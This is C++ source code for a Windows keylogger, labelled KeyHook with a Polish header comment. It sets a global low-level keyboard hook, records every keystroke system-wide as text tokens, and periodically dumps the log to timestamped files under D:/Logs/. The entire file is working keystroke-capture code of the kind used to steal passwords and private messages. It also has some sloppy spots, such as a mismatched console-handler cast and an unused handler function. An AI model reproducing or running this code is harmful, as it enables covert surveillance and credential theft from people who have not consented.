// KeyHook.cpp: Określa punkt wejścia dla aplikacji konsoli.
//

#include "stdafx.h"
#include "stdafx.h"
#include <Windows.h>
#include <cstdio>
#include <sstream>
#include <string>
#include <iostream>
#include <iomanip>
#include <fstream>
#include <ctime>
#include <memory>
#include <thread>

#define _WIN32_WINNT 0x050

std::shared_ptr<std::string> str = std::make_shared<std::string>("");
std::shared_ptr<int> str_count = std::make_shared<int>(0);
std::shared_ptr<time_t> lasttime = std::make_shared<time_t>(0);

std::string getDate()
{
	auto t = std::time(nullptr);
	auto tm = *std::localtime(&t);
	std::ostringstream ost;
	ost<<std::put_time(&tm, "%d-%m-%Y %H:%M:%S");
	return ost.str();
}

void saveFile()
{
	*lasttime = std::time(nullptr);
	std::string str2 = *str;
	*str = "";
	*str_count = 0;
	bool error = false;
	std::cout << "[" << getDate() << "] Start connection " << std::endl;
	try {
		std::ofstream file;
		std::string path = "D:/Logs/" + std::to_string(*lasttime);
		file.open(path, std::ios::out);
		file << "Stream date " << getDate() << "\n";
		file << str2;
		file.close();
	}
	catch (int ex)
	{
		std::cout << "[" << getDate() << "] Fail nr " << ex << std::endl;
		error = true;
	}
	if (!error) {
		std::cout << "[" << getDate() << "] Success" << std::endl;
	}
}

BOOL YourHandler(DWORD dwCtrlType)
{
	if (dwCtrlType == CTRL_CLOSE_EVENT)
	{
		saveFile();
	}

	return TRUE;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	BOOL fEatKeystroke = FALSE;

	if (nCode == HC_ACTION)
	{
		switch (wParam)
		{
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
		case WM_KEYUP:
		case WM_SYSKEYUP:
			PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
			//if (fEatKeystroke = (p->vkCode == 0x43))  //redirect a to b
			//{
			std::string curchar = "";
			int x, y;
			std::stringstream stream;
			stream << p->vkCode;
			stream >> y;
				if ((wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN)) // Keydown
				{
					
					if ((y >= 48 && y <= 57 )|| (y >= 65 && y <= 90)) {
						
						curchar = y;
					}
					else {
						switch (y)
						{
						// 162 ctrl
						// 164 alt
						// 13 enter
						// 8 backspace
						// 162, 165 - right alt
						// 163 - right ctrl
						// 220 \
						// 

						case 20:
							curchar = "[CAPS]";
							break;

						case 32:
							curchar = "[SPACE]";
							break;

						case 160:
							curchar = "[Shift]";
							break;

						case 164:
						case 165:
							curchar = "[Alt]";
							break;

						case 162:
						case 163:
							curchar = "[CTRL]";
							break;

						case 220:
							curchar = '\\';
							break;

						case 13:
							curchar = "[Ent]\n";
								break;

						case 8:
							curchar = "[Backsp]";
							break;

						default:
							curchar = "["+std::to_string(y)+"]";
						}

					}
				}
				if ((wParam == WM_KEYUP) || (wParam == WM_SYSKEYUP)) // Keyup
				{
					switch (y)
					{
					case 20:
						curchar = "[/CAPS]";
						break;

					case 160:
						curchar = "[/Shift]";
						break;

					case 164:
					case 165:
						curchar = "[/Alt]";
						break;

					case 162:
					case 163:
						curchar = "[/CTRL]";
						break;

					case 13:
						curchar = "[/Ent]";
						break;

					case 8:
						curchar = "[/Backsp]";
						break;

					default:
						break;
					}
				}
				
				if (curchar != "")
				{
					*str += curchar;
					(*str_count)++;
				}

				if (*str_count > 10000 || std::time(nullptr) - *lasttime > 10*60)
				{
					std::thread save = std::thread(saveFile);
					save.join();

				}
				break;
				//} // ?
			break;
		}
	}
	return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}

int main()
{
	std::cout << getDate() << " Initialization " << std::endl;

	*lasttime = std::time(nullptr);

	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);

	SetConsoleCtrlHandler((PHANDLER_ROUTINE)saveFile, TRUE);

	std::cout << getDate() << " Init success" << std::endl;

	// Keep this app running until we're told to stop
	MSG msg;
	while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hhkLowLevelKybd);

	saveFile(); // todo

	return(0);
}